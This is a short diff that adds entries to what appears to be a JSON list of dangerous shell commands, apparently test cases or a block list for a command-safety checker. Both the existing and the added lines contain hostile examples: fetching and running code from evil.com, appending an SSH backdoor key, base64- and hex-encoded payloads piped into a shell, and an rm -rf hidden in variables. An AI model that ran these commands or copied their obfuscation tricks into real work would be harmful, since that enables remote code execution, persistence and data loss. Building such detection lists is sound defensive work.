@@ -8,5 +8,11 @@
   "cat script.sh | sh",
   "bash -c 'eval \"$PAYLOAD\"'",
   "/bin/sh -c '$(curl -sSL http://evil.com/run)'",
-  "echo 'ssh backdoor' | tee -a ~/.ssh/authorized_keys"
+  "echo 'ssh backdoor' | tee -a ~/.ssh/authorized_keys",
+  "echo 'Y3VybCBleGZpbC5jb20=' | openssl enc -d -a | sh",
+  "export A='r'; export B='m'; export C='-rf'; $A$B $C /tmp/data",
+  "eval $(cat /tmp/hidden_stage2.sh)",
+  "cat payload.hex | xxd -r | bash",
+  "bash -c '`curl -s https://test.site/cmd`'",
+  "echo 'ZWNobyAncHduZWQnCg==' | base64 -d | bash"
 ]
